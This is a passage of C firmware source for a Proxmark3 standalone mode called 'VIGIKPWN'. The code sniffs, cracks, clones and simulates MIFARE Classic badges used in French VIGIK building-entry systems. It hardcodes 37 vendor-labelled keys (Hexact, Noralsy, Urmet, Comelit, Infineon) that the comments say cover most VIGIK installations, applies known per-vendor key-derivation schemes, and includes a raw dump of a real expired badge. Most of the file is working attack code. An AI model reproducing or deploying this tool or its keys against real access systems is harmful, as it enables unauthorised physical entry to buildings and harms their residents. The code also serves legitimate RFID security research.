//-----------------------------------------------------------------------------
// Colin Brigato, 2016, 2017
// Christian Herrmann, 2017
//
// This code is licensed to you under the terms of the GNU GPL, version 2 or,
// at your option, any later version. See the LICENSE.txt file for the text of
// the license.
//-----------------------------------------------------------------------------
// main code for HF Mifare aka ColinRun by Colin Brigato
//-----------------------------------------------------------------------------
#include "hf_colin.h"

#define MF1KSZ 1024
#define MF1KSZSIZE 64
#define AUTHENTICATION_TIMEOUT 848

uint8_t cjuid[10];
uint32_t cjcuid;
iso14a_card_select_t p_card;
int currline;
int currfline;
int curlline;

// TODO : Implement fast read of KEYS like in RFIdea
// also http://ext.delaat.net/rp/2015-2016/p04/report.pdf

// Colin's VIGIKPWN sniff/simulate/clone repeat routine for HF Mifare

/*
void cjPrintBigArray(const char *bigar, int len, uint8_t newlines, uint8_t debug)
{
    uint32_t chunksize = (PM3_CMD_DATA_SIZE / 4);
    uint8_t totalchunks = len / chunksize;
    uint8_t last_chunksize = len - (totalchunks * chunksize);
    char chunk[chunksize + 1];
    memset(chunk, 0x00, sizeof(chunk));
    if (debug > 0)
    {
        Dbprintf("len : %d", len);
        Dbprintf("chunksize : %d bytes", chunksize);
        Dbprintf("totalchunks : %d", totalchunks);
        Dbprintf("last_chunksize: %d", last_chunksize);
    }
    for (uint8_t i = 0; i < totalchunks; i++)
    {
        memset(chunk, 0x00, sizeof(chunk));
        memcpy(chunk, &bigar[i * chunksize], chunksize);
        DbprintfEx(FLAG_RAWPRINT, "%s", chunk);
    }
    if (last_chunksize > 0)
    {
        memset(chunk, 0x00, sizeof(chunk));
        memcpy(chunk, &bigar[totalchunks * chunksize], last_chunksize);
        DbprintfEx(FLAG_RAWPRINT, "%s", chunk);
    }
    if (newlines > 0)
    {
        DbprintfEx(FLAG_NEWLINE, " ");
    }
}
*/

void cjSetCursFRight() {
    vtsend_cursor_position(NULL, 98, (currfline));
    currfline++;
}

void cjSetCursRight() {
    vtsend_cursor_position(NULL, 59, (currline));
    currline++;
}

void cjSetCursLeft() {
    vtsend_cursor_position(NULL, 0, (curlline));
    curlline++;
}

void cjTabulize() { DbprintfEx(FLAG_RAWPRINT, "\t\t\t"); }

/*
void cjPrintKey(uint64_t key, uint8_t *foundKey, uint16_t sectorNo, uint8_t type) {
    char tosendkey[13];
    sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[0], foundKey[1], foundKey[2], foundKey[3], foundKey[4], foundKey[5]);
    cjSetCursRight();
    DbprintfEx(FLAG_NEWLINE, "SEC: %02x | KEY : %s | TYP: %d", sectorNo, tosendkey, type);
}
*/

void ReadLastTagFromFlash() {
    SpinOff(0);
    LED_A_ON();
    LED_B_ON();
    LED_C_ON();
    LED_D_ON();
    uint32_t startidx = 0;
    uint16_t len = 1024;

    DbprintfEx(FLAG_NEWLINE, "Button HELD ! Using LAST Known TAG for Simulation...");
    cjSetCursLeft();

    size_t size = len;
    uint8_t *mem = BigBuf_malloc(size);

    if (!FlashInit()) {
        return;
    }
    Flash_CheckBusy(BUSY_TIMEOUT);

    uint32_t start_time = GetTickCount();
    uint32_t delta_time = 0;

    for (size_t i = 0; i < len; i += size) {
        len = MIN((len - i), size);
        uint16_t isok = Flash_ReadDataCont(startidx + i, mem, len);
        if (isok == len) {
            emlSetMem(mem, 0, 64);
        } else {
            DbprintfEx(FLAG_NEWLINE, "FlashMem reading failed | %d | %d", len, isok);
            cjSetCursLeft();
            FlashStop();
            SpinOff(100);
            return;
        }
    }
    delta_time = GetTickCountDelta(start_time);
    DbprintfEx(FLAG_NEWLINE, "[OK] Last tag recovered from FLASHMEM set to emulator");
    cjSetCursLeft();
    DbprintfEx(FLAG_NEWLINE, "%s[IN]%s %s%dms%s for TAG_FLASH_READ", _XGREEN_, _XWHITE_, _XYELLOW_, delta_time, _XWHITE_);
    cjSetCursLeft();
    FlashStop();
    SpinOff(0);
    return;
}

void WriteTagToFlash(uint8_t index, size_t size) {
    SpinOff(0);
    LED_A_ON();
    LED_B_ON();
    LED_C_ON();
    LED_D_ON();

    uint32_t len = size;
    uint32_t bytes_sent = 0;
    uint32_t bytes_remaining = len;

    uint8_t data[(size * (16 * 64)) / 1024];
    uint8_t buff[PAGESIZE];

    emlGetMem(data, 0, (size * 64) / 1024);

    if (!FlashInit()) {
        return;
    }

    Flash_CheckBusy(BUSY_TIMEOUT);
    Flash_WriteEnable();
    Flash_Erase4k(0, 0);

    uint32_t start_time = GetTickCount();
    uint32_t delta_time = 0;

    while (bytes_remaining > 0) {
        Flash_CheckBusy(BUSY_TIMEOUT);
        Flash_WriteEnable();

        uint32_t bytes_in_packet = MIN(FLASH_MEM_BLOCK_SIZE, bytes_remaining);

        memcpy(buff, data + bytes_sent, bytes_in_packet);

        bytes_remaining -= bytes_in_packet;
        uint16_t res = Flash_WriteDataCont(bytes_sent + (index * size), buff, bytes_in_packet);
        bytes_sent += bytes_in_packet;

        uint8_t isok = (res == bytes_in_packet) ? 1 : 0;

        if (!isok) {
            DbprintfEx(FLAG_NEWLINE, "FlashMem write FAILEd [offset %u]", bytes_sent);
            cjSetCursLeft();
            SpinOff(100);
            return;
        }

        LED_A_INV();
        LED_B_INV();
        LED_C_INV();
        LED_D_INV();
    }
    delta_time = GetTickCountDelta(start_time);

    DbprintfEx(FLAG_NEWLINE, "[OK] TAG WRITTEN TO FLASH ! [0-to offset %u]", bytes_sent);
    cjSetCursLeft();
    DbprintfEx(FLAG_NEWLINE, "%s[IN]%s %s%dms%s for TAG_FLASH_WRITE", _XGREEN_, _XWHITE_, _XYELLOW_, delta_time, _XWHITE_);
    cjSetCursLeft();
    FlashStop();
    SpinOff(0);
    return;
}

void ModInfo(void) {
    DbpString("   HF Mifare ultra fast sniff/sim/clone - aka VIGIKPWN (Colin Brigato)");
}

void RunMod() {
    StandAloneMode();
    FpgaDownloadAndGo(FPGA_BITSTREAM_HF);

    currline = 20;
    curlline = 20;
    currfline = 24;
    memset(cjuid, 0, sizeof(cjuid));
    cjcuid = 0;
    uint8_t sectorsCnt = (MF1KSZ / MF1KSZSIZE);
    uint64_t key64;           // Defines current key
    uint8_t *keyBlock; // Where the keys will be held in memory.

    /* VIGIK EXPIRED DUMP FOR STUDY
    Sector 0
    121C7F730208040001FA33F5CB2D021D
    44001049164916491649000000000000
    00000000000000000000000000000000
    A0A1A2A3A4A579678800010203040506
    Sector 1
    0F000000000000000000000000000000
    AA0700002102080000740C110600AF13
    000000000000000001740C1108220000
    314B4947495679678800010203040506
    Sector 2
    24E572B923A3D243B402D60CAB576956
    216D6501FC8618B6C426762511AC2DEE
    25BF4CEC3618D0BAB3A6E9210D887746
    314B4947495679678800010203040506
    Sector 3
    0FBC41A5D95398E76A1B2029E8EA9735
    088BA2CE732653D0C1147596AFCF94D7
    77B4D91F0442182273A29DEAF7A2D095
    314B4947495679678800010203040506
    Sector 4
    4CEE715866E508CDBC95C640EC9D1E58
    E800457CF8B079414E1B45DD3E6C9317
    77B4D91F0442182273A29DEAF7A2D095
    314B4947495679678800010203040506
    010203040506  0
    Sector 5-0F
    00000000000000000000000000000000
    00000000000000000000000000000000
    00000000000000000000000000000000
    FFFFFFFFFFFFFF078069FFFFFFFFFFFF
    KEY A : 1KGIV ;
    ACCBITS : 796788[00]+VALUE
    */

    //----------------------------
    //   Set of keys to be used.
    //  This should cover ~98% of
    //  French VIGIK system @2017
    //----------------------------

#define STKEYS 37

    const uint64_t mfKeys[STKEYS] = {
        0xffffffffffff, // TRANSPORTS
        0x000000000000, // Blankkey
        0x484558414354, // INFINEONON A / 0F SEC B / INTRATONE / HEXACT...
        0x414c41524f4e, // ALARON NORALSY
        0x424c41524f4e, // BLARON NORALSY
        0x4a6352684677, // COMELIT A General Key  / 08 [2] 004
        0x536653644c65, // COMELIT B General Key  / 08 [2] 004
        0x8829da9daf76, // URMET CAPTIV IF A => ALL A/B / BTICINO
        0x314B49474956, // "1KIGIV" VIGIK'S SERVICE BADGE A KEY
        0xa0a1a2a3a4a5, // PUBLIC BLOC0 BTICINO MAD ACCESS
        0x021209197591, // BTCINO UNDETERMINED SPREAKD 0x01->0x13 key
        0x010203040506, // VIGIK's B Derivative
        0xb0b1b2b3b4b5, // NA DERIVATE B # 1
        0xaabbccddeeff, // NA DERIVATE B # 1
        0x4d3a99c351dd, // NA DERIVATE B # 1
        0x1a982c7e459a, // NA DERIVATE B # 1
        0xd3f7d3f7d3f7, // NA DERIVATE B # 1
        0x714c5c886e97, // NA DERIVATE B # 1
        0x587ee5f9350f, // NA DERIVATE B # 1
        0xa0478cc39091, // NA DERIVATE B # 1
        0x533cb6c723f6, // NA DERIVATE B # 1
        0x8fd0a4f256e9, // NA DERIVATE B # 1
        0xa22ae129c013, // INFINEON B 00
        0x49fae4e3849f, // INFINEON B 01
        0x38fcf33072e0, // INFINEON B 02
        0x8ad5517b4b18, // INFINEON B 03
        0x509359f131b1, // INFINEON B 04
        0x6c78928e1317, // INFINEON B 05
        0xaa0720018738, // INFINEON B 06
        0xa6cac2886412, // INFINEON B 07
        0x62d0c424ed8e, // INFINEON B 08
        0xe64a986a5d94, // INFINEON B 09
        0x8fa1d601d0a2, // INFINEON B 0A
        0x89347350bd36, // INFINEON B 0B
        0x66d2b7dc39ef, // INFINEON B 0C
        0x6bc1e1ae547d, // INFINEON B 0D
        0x22729a9bd40f  // INFINEON B 0E
    };

    // Can remember something like that in case of Bigbuf
    keyBlock = BigBuf_malloc(STKEYS * 6);
    int mfKeysCnt = sizeof(mfKeys) / sizeof(uint64_t);

    for (int mfKeyCounter = 0; mfKeyCounter < mfKeysCnt; mfKeyCounter++) {
        num_to_bytes(mfKeys[mfKeyCounter], 6, (uint8_t *)(keyBlock + mfKeyCounter * 6));
    }

    // TODO : remember why we actually had need to initialize this array in such specific case
    //   and why not a simple memset abuse to 0xffize the whole space in one go ?
    // uint8_t foundKey[2][40][6]; //= [ {0xff} ]; /* C99 abusal 6.7.8.21
    uint8_t foundKey[2][40][6];
    for (uint16_t i = 0; i < 2; i++) {
        for (uint16_t sectorNo = 0; sectorNo < sectorsCnt; sectorNo++) {
            foundKey[i][sectorNo][0] = 0xFF;
            foundKey[i][sectorNo][1] = 0xFF;
            foundKey[i][sectorNo][2] = 0xFF;
            foundKey[i][sectorNo][3] = 0xFF;
            foundKey[i][sectorNo][4] = 0xFF;
            foundKey[i][sectorNo][5] = 0xFF;
        }
    }

    int key = -1;
    bool err = 0;
    bool trapped = 0;
    bool allKeysFound = true;

    uint32_t size = mfKeysCnt;

    // banner:
    vtsend_reset(NULL);
    DbprintfEx(FLAG_NEWLINE, "\r\n%s", clearTerm);
    DbprintfEx(FLAG_NEWLINE, "%s%s%s", _XCYAN_, sub_banner, _XWHITE_);
    DbprintfEx(FLAG_NEWLINE, "%s>>%s C.J.B's MifareFastPwn Started\r\n", _XRED_, _XWHITE_);

    currline = 20;
    curlline = 20;
    currfline = 24;
    cjSetCursLeft();

failtag:

    vtsend_cursor_position_save(NULL);
    vtsend_set_attribute(NULL, 1);
    vtsend_set_attribute(NULL, 5);
    DbprintfEx(FLAG_NEWLINE, "\t\t\t[ Waiting For Tag ]");
    vtsend_set_attribute(NULL, 0);

    iso14443a_setup(FPGA_HF_ISO14443A_READER_LISTEN);
    SpinOff(50);
    LED_A_ON();
    uint8_t ticker = 0;
    //while (!BUTTON_PRESS() && !iso14443a_select_card(cjuid, NULL, &cjcuid, true, 0, true))
    while (!iso14443a_select_card(cjuid, &p_card, &cjcuid, true, 0, true)) {
        WDT_HIT();

        ticker++;
        if (ticker % 64 == 0) {
            LED_A_INV();
        }

        if (BUTTON_HELD(10) > 0) {
            WDT_HIT();
            DbprintfEx(FLAG_NEWLINE, "\t\t\t[    READING FLASH   ]");
            ReadLastTagFromFlash();
            goto readysim;
        }
    }

    SpinOff(50);

    FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
    vtsend_cursor_position_restore(NULL);
    DbprintfEx(FLAG_NEWLINE, "\t\t\t%s[   GOT a Tag !   ]%s", _XGREEN_, _XWHITE_);
    cjSetCursLeft();
    DbprintfEx(FLAG_NEWLINE, "\t\t\t       `---> Breaking keys ---->");
    cjSetCursRight();

    DbprintfEx(FLAG_NEWLINE, "\t%sGOT TAG :%s %08x%s", _XRED_, _XCYAN_, cjcuid, _XWHITE_);

    if (cjcuid == 0) {
        cjSetCursLeft();
        DbprintfEx(FLAG_NEWLINE, "%s>>%s BUG: 0000_CJCUID! Retrying...", _XRED_, _XWHITE_);
        SpinErr(0, 100, 8);
        goto failtag;
    }

    SpinOff(50);
    LED_B_ON();
    cjSetCursRight();
    DbprintfEx(FLAG_NEWLINE, "--------+--------------------+-------");
    cjSetCursRight();
    DbprintfEx(FLAG_NEWLINE, " SECTOR |        KEY         |  A/B  ");
    cjSetCursRight();
    DbprintfEx(FLAG_NEWLINE, "--------+--------------------+-------");

    uint32_t start_time = GetTickCount();
    uint32_t delta_time = 0;

    //---------------------------------------------------------------------------
    // WE SHOULD FIND A WAY TO GET UID TO AVOID THIS "TESTRUN"
    // --------------------------------------------------------
    // + HERE IS TO BE THOUGHT AS ONLY A KEY SHOULD BE CHECK
    // `-+ THEN WE FILL EMULATOR WITH KEY
    // `-+ WHEN WE FILL EMULATOR CARD WITH A KEY
    // `-+ IF THERE IS ANY FAIL DURING ANY POINT, WE START BACK CHECKING B KEYS
    // `-+ THEN FILL EMULATOR WITH B KEEY
    // `-+ THEN EMULATOR WITH CARD WITH B KEY
    // `-+ IF IT HAS FAILED OF ANY OF SORT THEN WE ARE MARRON LIKE POMALO.
    //----------------------------------------------------------------------------
    // AN EVEN BETTER IMPLEMENTATION IS TO CHECK EVERY KEY FOR SECTOR 0 KEY A
    // THEN IF FOUND CHECK THE SAME KEY FOR NEXT SECTOR ONLY KEY A
    // THEN IF FAIL CHECK EVERY SECTOR A KEY FOR EVERY OTHER KEY BUT NOT THE BLOCK
    // 0 KEY
    // THEN TRY TO READ B KEYS FROM KNOWN A KEYS
    // IF FAIL, CHECK SECTOR 0 B KEY WITH SECTOR 0 A KEY
    // THEN IF FOUND CHECK EVERY SECTOR FOR SAME B KEY
    // ELSE IF FAIL CHECK EVERY KEY FOR SECTOR 0 KEY B
    // THEN IF FOUND CHECK SAME KEY FOR ONLY NEXT SECTOR KEY B (PROBABLE A KEY IS
    // SAME FOR EVERY SECTOR AND B KEY IS SAME FOR EVERY SECTOR WITH JUST A vs B
    // DERIVATION
    // THEN IF B KEY IS NOT OF THIS SCHEME CHECK EVERY REMAINING B KEYED SECTOR
    // WITH EVERY REMAINING KEYS, BUT DISCARDING ANY DEFAULT TRANSPORT KEYS.
    //-----------------------------------------------------------------------------
    // also we could avoid first UID check for every block

    // then let’s expose this “optimal case” of “well known vigik schemes” :
    for (uint8_t type = 0; type < 2 && !err && !trapped; type++) {
        for (int sec = 0; sec < sectorsCnt && !err && !trapped; ++sec) {
            key = cjat91_saMifareChkKeys(sec * 4, type, NULL, size, &keyBlock[0], &key64);

            if (key == -1) {
                err = 1;
                allKeysFound = false;
                // used in “portable” imlementation on microcontroller: it reports back the fail and open the standalone lock
                // reply_old(CMD_CJB_FSMSTATE_MENU, 0, 0, 0, 0, 0);
                break;
            } else if (key == -2) {
                err = 1; // Can't select card.
                allKeysFound = false;
                // reply_old(CMD_CJB_FSMSTATE_MENU, 0, 0, 0, 0, 0);
                break;
            } else {
                /*  BRACE YOURSELF : AS LONG AS WE TRAP A KNOWN KEY, WE STOP CHECKING AND ENFORCE KNOWN SCHEMES */
                // uint8_t tosendkey[13];
                char tosendkey[13];
                num_to_bytes(key64, 6, foundKey[type][sec]);
                cjSetCursRight();
                DbprintfEx(FLAG_NEWLINE, "SEC: %02x ; KEY : %012" PRIx64 " ; TYP: %i", sec, key64, type);
                /*reply_old(CMD_CJB_INFORM_CLIENT_KEY, 12, sec, type, tosendkey, 12);*/
                switch (key64) {
                    /////////////////////////////////////////////////////////
                    // COMMON SCHEME 1  : INFINITRON/HEXACT
                    case 0x484558414354:
                        cjSetCursLeft();
                        DbprintfEx(FLAG_NEWLINE, "%s>>>>>>>>>>>>!*STOP*!<<<<<<<<<<<<<<%s", _XRED_, _XWHITE_);
                        cjSetCursLeft();

                        DbprintfEx(FLAG_NEWLINE, "    .TAG SEEMS %sDETERMINISTIC%s.     ", _XGREEN_, _XWHITE_);
                        cjSetCursLeft();

                        DbprintfEx(FLAG_NEWLINE, "%sDetected: %s INFI_HEXACT_VIGIK_TAG%s", _XORANGE_, _XCYAN_, _XWHITE_);
                        cjSetCursLeft();

                        DbprintfEx(FLAG_NEWLINE, "...%s[%sKey_derivation_schemeTest%s]%s...", _XYELLOW_, _XGREEN_, _XYELLOW_, _XGREEN_);
                        cjSetCursLeft();

                        DbprintfEx(FLAG_NEWLINE, "%s>>>>>>>>>>>>!*DONE*!<<<<<<<<<<<<<<%s", _XGREEN_, _XWHITE_);
                        ;
                        // Type 0 / A first
                        uint16_t t = 0;
                        for (uint16_t s = 0; s < sectorsCnt; s++) {
                            num_to_bytes(0x484558414354, 6, foundKey[t][s]);
                            sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][s][0], foundKey[t][s][1], foundKey[t][s][2],
                                    foundKey[t][s][3], foundKey[t][s][4], foundKey[t][s][5]);
                            cjSetCursRight();
                            DbprintfEx(FLAG_NEWLINE, "SEC: %02x ; KEY : %s ; TYP: %d", s, tosendkey, t);
                        }
                        t = 1;
                        uint16_t sectorNo = 0;
                        num_to_bytes(0xa22ae129c013, 6, foundKey[t][sectorNo]);
                        sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                                foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                        cjSetCursRight();

                        DbprintfEx(FLAG_NEWLINE, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                        sectorNo = 1;
                        num_to_bytes(0x49fae4e3849f, 6, foundKey[t][sectorNo]);
                        sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                                foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                        cjSetCursRight();

                        DbprintfEx(FLAG_NEWLINE, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                        sectorNo = 2;
                        num_to_bytes(0x38fcf33072e0, 6, foundKey[t][sectorNo]);
                        sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                                foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                        cjSetCursRight();

                        DbprintfEx(FLAG_NEWLINE, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                        sectorNo = 3;
                        num_to_bytes(0x8ad5517b4b18, 6, foundKey[t][sectorNo]);
                        sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                                foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                        cjSetCursRight();

                        DbprintfEx(FLAG_NEWLINE, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                        sectorNo = 4;
                        num_to_bytes(0x509359f131b1, 6, foundKey[t][sectorNo]);
                        sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                                foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                        cjSetCursRight();

                        DbprintfEx(FLAG_NEWLINE, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                        sectorNo = 5;
                        num_to_bytes(0x6c78928e1317, 6, foundKey[t][sectorNo]);
                        sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                                foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                        cjSetCursRight();

                        DbprintfEx(FLAG_NEWLINE, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                        sectorNo = 6;
                        num_to_bytes(0xaa0720018738, 6, foundKey[t][sectorNo]);
                        sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                                foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                        cjSetCursRight();

                        DbprintfEx(FLAG_NEWLINE, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                        sectorNo = 7;
                        num_to_bytes(0xa6cac2886412, 6, foundKey[t][sectorNo]);
                        sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                                foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                        cjSetCursRight();

                        DbprintfEx(FLAG_NEWLINE, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                        sectorNo = 8;
                        num_to_bytes(0x62d0c424ed8e, 6, foundKey[t][sectorNo]);
                        sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                                foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                        cjSetCursRight();

                        DbprintfEx(FLAG_NEWLINE, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                        sectorNo = 9;
                        num_to_bytes(0xe64a986a5d94, 6, foundKey[t][sectorNo]);
                        sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                                foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                        cjSetCursRight();

                        DbprintfEx(FLAG_NEWLINE, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                        sectorNo = 10;
                        num_to_bytes(0x8fa1d601d0a2, 6, foundKey[t][sectorNo]);
                        sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                                foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                        cjSetCursRight();

                        DbprintfEx(FLAG_NEWLINE, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                        sectorNo = 11;
                        num_to_bytes(0x89347350bd36, 6, foundKey[t][sectorNo]);
                        sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                                foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                        cjSetCursRight();

                        DbprintfEx(FLAG_NEWLINE, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                        sectorNo = 12;
                        num_to_bytes(0x66d2b7dc39ef, 6, foundKey[t][sectorNo]);
                        sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                                foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                        cjSetCursRight();

                        DbprintfEx(FLAG_NEWLINE, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                        sectorNo = 13;
                        num_to_bytes(0x6bc1e1ae547d, 6, foundKey[t][sectorNo]);
                        sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                                foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                        cjSetCursRight();

                        DbprintfEx(FLAG_NEWLINE, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                        sectorNo = 14;
                        num_to_bytes(0x22729a9bd40f, 6, foundKey[t][sectorNo]);
                        sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                                foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                        cjSetCursRight();

                        DbprintfEx(FLAG_NEWLINE, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                        sectorNo = 15;
                        num_to_bytes(0x484558414354, 6, foundKey[t][sectorNo]);
                        sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                                foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                        cjSetCursRight();

                        DbprintfEx(FLAG_NEWLINE, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                        trapped = 1;
                        break;
                    ////////////////END OF SCHEME 1//////////////////////////////

                    ///////////////////////////////////////
                    // COMMON SCHEME 2  : URMET CAPTIVE / COGELEC!/?
                    case 0x8829da9daf76:
                        cjSetCursLeft();

                        DbprintfEx(FLAG_NEWLINE, "%s>>>>>>>>>>>>!*STOP*!<<<<<<<<<<<<<<%s", _XRED_, _XWHITE_);
                        cjSetCursLeft();

                        DbprintfEx(FLAG_NEWLINE, "    .TAG SEEMS %sDETERMINISTIC%s.     ", _XGREEN_, _XWHITE_);
                        cjSetCursLeft();

                        DbprintfEx(FLAG_NEWLINE, "%sDetected :%sURMET_CAPTIVE_VIGIK_TAG%s", _XORANGE_, _XCYAN_, _XWHITE_);
                        cjSetCursLeft();

                        DbprintfEx(FLAG_NEWLINE, "...%s[%sKey_derivation_schemeTest%s]%s...", _XYELLOW_, _XGREEN_, _XYELLOW_, _XGREEN_);
                        cjSetCursLeft();

                        DbprintfEx(FLAG_NEWLINE, "%s>>>>>>>>>>>>!*DONE*!<<<<<<<<<<<<<<%s", _XGREEN_, _XWHITE_);
                        cjSetCursLeft();

                        // emlClearMem();
                        // A very weak one...
                        for (uint16_t i = 0; i < 2; i++) {
                            for (uint16_t s = 0; s < sectorsCnt; s++) {
                                num_to_bytes(key64, 6, foundKey[i][s]);
                                sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x",
                                        foundKey[i][s][0],
                                        foundKey[i][s][1],
                                        foundKey[i][s][2],
                                        foundKey[i][s][3],
                                        foundKey[i][s][4],
                                        foundKey[i][s][5]
                                       );
                                cjSetCursRight();
                                DbprintfEx(FLAG_NEWLINE, "SEC: %02x ; KEY : %s ; TYP: %d", s, tosendkey, i);
                            }
                        }
                        trapped = 1;
                        break;
                    ////////////////END OF SCHEME 2//////////////////////////////

                    ///////////////////////////////////////
                    // COMMON SCHEME 3  : NORALSY "A-LARON & B-LARON . . . NORAL-B & NORAL-A"
                    case 0x414c41524f4e: // Thumbs up to the guy who had the idea of such a "mnemotechnical" key pair
                    case 0x424c41524f4e:
                        cjSetCursLeft();

                        DbprintfEx(FLAG_NEWLINE, "%s>>>>>>>>>>>>!*STOP*!<<<<<<<<<<<<<<%s", _XRED_, _XWHITE_);
                        cjSetCursLeft();

                        DbprintfEx(FLAG_NEWLINE, "    .TAG SEEMS %sDETERMINISTIC%s.     ", _XGREEN_, _XWHITE_);
                        cjSetCursLeft();

                        DbprintfEx(FLAG_NEWLINE, "%s  Detected :%sNORALSY_VIGIK_TAG %s", _XORANGE_, _XCYAN_, _XWHITE_);
                        cjSetCursLeft();

                        DbprintfEx(FLAG_NEWLINE, "...%s[%sKey_derivation_schemeTest%s]%s...", _XYELLOW_, _XGREEN_, _XYELLOW_, _XGREEN_);
                        cjSetCursLeft();

                        DbprintfEx(FLAG_NEWLINE, "%s>>>>>>>>>>>>!*DONE*!<<<<<<<<<<<<<<%s", _XGREEN_, _XWHITE_);

                        t = 0;
                        for (uint16_t s = 0; s < sectorsCnt; s++) {
                            num_to_bytes(0x414c41524f4e, 6, foundKey[t][s]);
                            sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x",
                                    foundKey[t][s][0],
                                    foundKey[t][s][1],
                                    foundKey[t][s][2],
                                    foundKey[t][s][3],
                                    foundKey[t][s][4],
                                    foundKey[t][s][5]);
                            cjSetCursRight();
                            DbprintfEx(FLAG_NEWLINE, "SEC: %02x ; KEY : %s ; TYP: %d", s, tosendkey, t);
                        }

                        t = 1;
                        for (uint16_t s = 0; s < sectorsCnt; s++) {
                            num_to_bytes(0x424c41524f4e, 6, foundKey[t][s]);
                            sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x",
                                    foundKey[t][s][0],
                                    foundKey[t][s][1],
                                    foundKey[t][s][2],
                                    foundKey[t][s][3],
                                    foundKey[t][s][4],
                                    foundKey[t][s][5]);
                            cjSetCursRight();
                            DbprintfEx(FLAG_NEWLINE, "SEC: %02x ; KEY : %s ; TYP: %d", s, tosendkey, t);
                        }
                        trapped = 1;
                        break;
                        ////////////////END OF SCHEME 3//////////////////////////////
                }
                /* etc etc for testing schemes quick schemes */
            }
        }
    }

    if (!allKeysFound) {
        cjSetCursLeft();
        cjTabulize();
